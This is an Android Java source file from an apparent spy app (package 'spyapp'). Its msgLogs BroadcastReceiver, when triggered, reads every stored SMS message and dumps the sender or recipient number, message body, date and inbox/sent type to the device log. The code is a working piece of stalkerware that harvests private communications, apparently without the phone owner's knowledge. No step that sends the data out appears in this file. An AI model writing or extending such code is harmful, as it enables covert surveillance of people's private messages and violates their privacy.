package kkactive_india.in.spyapp;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.database.Cursor;
import android.net.Uri;
import android.provider.Telephony;
import android.util.Log;

import java.util.ArrayList;
import java.util.Date;
import java.util.List;

public class msgLogs extends BroadcastReceiver {
    @Override
    public void onReceive(Context context, Intent intent) {


        List<String> sms = new ArrayList<String>();
        Uri uriSMSURI = Uri.parse("content://sms");
        StringBuffer sb = new StringBuffer();
        String strOrder = android.provider.CallLog.Calls.DATE + " DESC";
        Cursor cur = context.getContentResolver().query(uriSMSURI, null, null, null, strOrder);

        sb.append("SMS Details :");
        while (cur != null && cur.moveToNext()) {
            String name = cur.getString(cur.getColumnIndexOrThrow("_id"));
            String address = cur.getString(cur.getColumnIndex("address"));
            String body = cur.getString(cur.getColumnIndexOrThrow("body"));
            String date = cur.getString(cur.getColumnIndexOrThrow("date"));
            Date dateFormat = new Date(Long.valueOf(date));
            String type = null;
            switch (Integer.parseInt(cur.getString(cur.getColumnIndexOrThrow(Telephony.Sms.TYPE)))) {
                case Telephony.Sms.MESSAGE_TYPE_INBOX:
                    type = "inbox";
                    break;
                case Telephony.Sms.MESSAGE_TYPE_SENT:
                    type = "sent";
                    break;
                /*case Telephony.Sms.MESSAGE_TYPE_DRAFT:
                    type = "draft";
                    break;*/
                default:
                    break;
            }
            sms.add("\nNumber: " + address + "\n Message: " + body + "\n Date:" + dateFormat + "\n Type:" + type);

            sb.append("\nNumber: " + address + "\n Message: " + body + "\n Date:" + dateFormat + "\n Type:" + type);
            sb.append("\n-----------------");
        }
        Log.d("SMSS", sms.toString());
        //textView.setText(sb);

        if (cur != null) {
            cur.close();
        }
        //return sms;



    }
}
